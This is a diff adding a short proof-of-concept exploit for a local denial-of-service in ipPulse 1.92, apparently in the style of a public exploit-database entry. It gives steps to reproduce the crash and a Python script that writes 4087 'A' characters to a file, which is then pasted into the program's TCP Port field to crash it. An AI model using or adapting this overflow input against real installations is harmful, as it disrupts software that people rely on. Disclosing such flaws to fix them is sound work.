@@ -1,0 +1,26 @@
+# Exploit Title: ipPulse 1.92 - 'TCP Port' Denial of Service (PoC)
+# Discovery by: Diego Santamaria
+# Discovery Date: 2018-08-28
+# Vendor Homepage: https://www.netscantools.com/ippulseinfo.html
+# Software Link: http://download.netscantools.com/ipls192.zip
+# Tested Version: 1.92
+# Vulnerability Type: Denial of Service (DoS) Local
+# Tested on OS: Windows 7 Professional
+ 
+# Steps to Reproduce: 
+
+# 1. Run the python code TCP_port.py 
+# 2. Open TCP_exploit.txt and copy the content 
+# 3. Open ipPulse.exe 
+# 4. Choose 'Target Editor' 
+# 5. write '1' in 'IP Adreess'
+# 6. Paste the content from exploit.txt on 'TCP Port'
+# 7. Press 'Add Above Fields to Target List'
+# 8. Press ok and Crashed
+ 
+#!/usr/bin/env python
+
+content = "\x41" * 4087
+f = open ("TCP_exploit.txt", "w")
+f.write(content)
+f.close()
